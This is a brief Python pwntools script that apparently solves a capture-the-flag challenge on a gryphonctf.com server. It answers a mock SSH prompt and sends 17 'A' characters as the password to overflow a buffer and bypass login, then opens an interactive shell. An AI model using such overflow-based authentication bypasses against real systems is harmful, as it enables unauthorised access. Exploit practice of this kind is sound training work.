#! /usr/bin/env python
from pwn import *
import string

t = remote("pwn2.chal.gryphonctf.com", 17341)

t.recvuntil("Are you sure you want to continue connecting (yes/no)?")
t.sendline("yes")

t.recvuntil("root@backend.cia.gov's password: ")
t.sendline('A' * 17)

t.interactive()
